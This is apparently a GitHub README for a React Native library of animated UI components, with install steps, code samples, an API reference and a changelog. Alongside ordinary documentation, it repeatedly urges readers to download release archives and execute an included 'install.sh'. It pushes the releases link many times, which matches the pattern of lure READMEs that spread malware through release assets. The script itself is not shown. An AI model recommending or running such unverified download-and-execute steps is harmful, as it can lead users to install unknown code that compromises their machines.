https://github.com/shahadat003/rn-animated-components/releases

# RN Animated Components — Smooth UI for React Native Apps 🚀

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/shahadat003/rn-animated-components/releases)

Animated components for React Native. This repo collects reusable, battle-tested animated UI pieces. Use them to build smooth interfaces, micro-interactions, and motion-driven layouts.

Table of Contents
- What this repo offers
- Install & run (download and execute release)
- Quick start
- Components (list + code samples)
- Patterns & animation techniques
- API overview
- Performance tips
- Theming & customization
- Tests & examples
- Contribution guide
- License & changelog

What this repo offers
- Declarative animated components you can drop into React Native apps.
- Small, focused components: animated buttons, loaders, list transitions, card flips, shared element helpers.
- Integrations for Animated API, Reanimated v2, and LayoutAnimation.
- TypeScript types and clear props.
- Example app and storybook-style demo.

Install & run (download and execute release)
- Visit the releases page and download the release asset. Example:
  https://github.com/shahadat003/rn-animated-components/releases
- Download the packaged file for your platform. For example:
  - rn-animated-components-v1.2.0.tar.gz
  - rn-animated-components-v1.2.0.zip
- After download, extract and execute the install script or copy the library files into your project. Example CLI:
  - tar -xzf rn-animated-components-v1.2.0.tar.gz
  - cd rn-animated-components-v1.2.0
  - ./install.sh
- The release file needs to be downloaded and executed to install optional native modules and demo assets.

If the release link does not work in your environment, check the project's Releases section on GitHub to find the packaged files and installation notes:
https://github.com/shahadat003/rn-animated-components/releases

Quick start

1) Install the package (npm / yarn)
- If you use the packaged release, follow the install script above.
- If you use npm (package published to registry), run:
  npm install rn-animated-components
  or
  yarn add rn-animated-components

2) Link native modules (if needed)
- Some components use native drivers. Run:
  npx pod-install

3) Import and use
- Example: AnimatedButton
  import { AnimatedButton } from 'rn-animated-components'
  <AnimatedButton onPress={() => console.log('tap')} label="Send" />

Components (selection with examples)

AnimatedButton
- A pressable button with scale, ripple, and subtle motion. Works with useNativeDriver for better performance.

Usage:
```
import { AnimatedButton } from 'rn-animated-components'

<AnimatedButton
  label="Send"
  onPress={handleSend}
  variant="primary"
  icon="send"
/>
```

AnimatedCard
- Card with entry animation, shadow lift on press, and flip mode.

Usage:
```
import { AnimatedCard } from 'rn-animated-components'

<AnimatedCard
  front={<Image source={{uri: img}} />}
  back={<View><Text>Details</Text></View>}
  flipOnTap
/>
```

ListTransition
- Smooth list animations for add/remove/reorder. Wrap FlatList with ListTransition to get fluid layout changes.

Usage:
```
import { ListTransition } from 'rn-animated-components'

<ListTransition
  data={items}
  keyExtractor={i => i.id}
  renderItem={({item}) => <ItemCard item={item} />}
/>
```

SharedElementHelper
- Helpers for shared element transitions between screens. Uses measure and layout to animate position and size.

Usage:
```
import { SharedElement } from 'rn-animated-components'

<SharedElement id="photo-1">
  <Image source={{uri: photo}} />
</SharedElement>
```

LoadingSpinner
- Custom spinner with animated stroke and easing options.

Usage:
```
import { LoadingSpinner } from 'rn-animated-components'

<LoadingSpinner size={48} color="#0A84FF" />
```

Patterns & animation techniques

- useNativeDriver
  Use native driver for transforms and opacity to keep the UI thread free. The lib falls back to JS driver when necessary.

- Reanimated v2
  If you use Reanimated, the components expose hooks to drive animations with worklets.

- LayoutAnimation vs manual anim
  Use LayoutAnimation for simple layout changes. Use Animated/Reanimated for precise control.

- Shared element transitions
  Measure source and target, create an overlay, and animate transform + borderRadius. The library provides helpers to reduce boilerplate.

- Gesture-driven motion
  Combine PanGestureHandler with animated values. Use clamp and spring to prevent overshoot.

API overview

- Props follow simple naming:
  - variant: 'primary' | 'secondary' | 'ghost'
  - duration: number (ms)
  - easing: 'linear' | 'ease-in' | 'ease-out' | 'spring'
  - useNativeDriver: boolean

- Hooks:
  - useAnimatedToggle(initial: boolean)
  - useSharedElement(id: string)

- Exports:
  - components: AnimatedButton, AnimatedCard, ListTransition, LoadingSpinner, SharedElement
  - hooks: useAnimatedToggle, useSharedElement

Performance tips

- Keep animations on native thread. Set useNativeDriver to true for opacity/transform.
- Use small animated value counts. Merge related animations into a single Animated.timing call when possible.
- Avoid re-rendering parent views while animation runs. Use shouldComponentUpdate or React.memo.
- Unmount listeners on cleanup. Cancel animations when views unmount.
- Use image prefetch for animated image transitions.

Theming & customization

- Theme tokens
  - The library uses token-based theming. Override tokens via ThemeProvider.
  - Example tokens: primaryColor, surfaceRadius, motionDuration.

- Style props
  - Most components accept style prop that merges with internal styles.
  - Provide custom interpolators for transforms and easing when you need custom motion.

- Assets
  - Use SVG or vector assets to reduce layout cost on animations.
  - Use lottie for complex animations. The repo includes a Lottie wrapper.

Testing & examples

- Example app
  The release package includes a demo app. Run the demo to try all components and patterns.

- Storybook
  We include stories for each component. Start Storybook locally:
  yarn storybook
  or run the included demo script from the release package.

- Unit tests
  The library uses Jest and react-native-testing-library. Run:
  yarn test

Contribution guide

- Code style
  - Use TypeScript.
  - Keep functions small.
  - Use clear names.

- Branches
  - Create a feature branch per PR.
  - Open a PR with tests and demo.

- Tests
  - Add tests for new components.
  - Add snapshot tests for animations when possible.

- CI
  - The repo runs unit tests and lint on push.

Changelog & releases
- Check the Releases page for packaged builds and changelog:
  https://github.com/shahadat003/rn-animated-components/releases
- Download the release file and execute the included installer to get the demo app and native modules.

Examples and screenshots

Animated button demo (use local demo or the release demo app)
![Animated button demo GIF](https://media.giphy.com/media/xUOxf48t3q2d0gN5l6/giphy.gif)

List transition example
![List transition GIF](https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif)

API reference (brief)

AnimatedButton
- Props:
  - label: string
  - onPress: () => void
  - variant?: 'primary' | 'secondary' | 'ghost'
  - disabled?: boolean
  - duration?: number
  - useNativeDriver?: boolean

AnimatedCard
- Props:
  - front: ReactNode
  - back?: ReactNode
  - flipOnTap?: boolean
  - onFlip?: () => void
  - duration?: number

ListTransition
- Props:
  - data: any[]
  - keyExtractor: (item) => string
  - renderItem: (info) => ReactNode
  - animationConfig?: {duration: number; easing: string}

SharedElement
- Props:
  - id: string
  - children: ReactNode

Troubleshooting
- If you hit native build errors, run pod install and rebuild the app.
- If an animation stutters, set useNativeDriver: true where supported and reduce JS work on the main thread.

License
- MIT. See LICENSE file in the repo.

Contact & maintainers
- Maintained by the community. Open issues or PRs on GitHub.

Changelog snapshot
- v1.2.0 — Add ListTransition, SharedElement helpers, demo app
- v1.1.0 — Add AnimatedCard flip mode and new easing options
- v1.0.0 — Initial release with basic components

Credits & resources
- Built with React Native Animated API, Reanimated v2, and Gesture Handler.
- Motion design inspiration from Material motion and iOS Human Interface Guidelines.

Badges
[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/shahadat003/rn-animated-components/releases)